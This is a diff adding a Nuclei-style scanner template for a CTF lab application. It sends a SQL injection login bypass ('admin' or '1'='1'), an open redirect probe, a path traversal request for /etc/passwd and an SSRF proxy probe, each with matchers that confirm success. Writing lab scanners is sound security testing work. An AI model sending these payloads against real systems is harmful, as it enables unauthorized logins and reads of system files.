@@ -1,0 +1,59 @@
+id: ctf-lab-custom-checks
+
+info:
+  name: CTF Lab Custom Vulnerability Checks
+  author: antigravity
+  severity: high
+  description: Checks for specific vulnerabilities in the CTF Lab application.
+
+http:
+  - raw:
+      - |
+        POST /api/login-db HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username": "admin' or '1'='1", "password": "password"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome back"
+          - "CTF{"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/redirect?url=https://example.com"
+    
+    matchers:
+      - type: status
+        status:
+          - 307
+          - 302
+          - 301
+      - type: word
+        part: header
+        words:
+          - "Location: https://example.com"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/file?file=../../../../etc/passwd"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:root"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/proxy?url=https://example.com"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Example Domain"
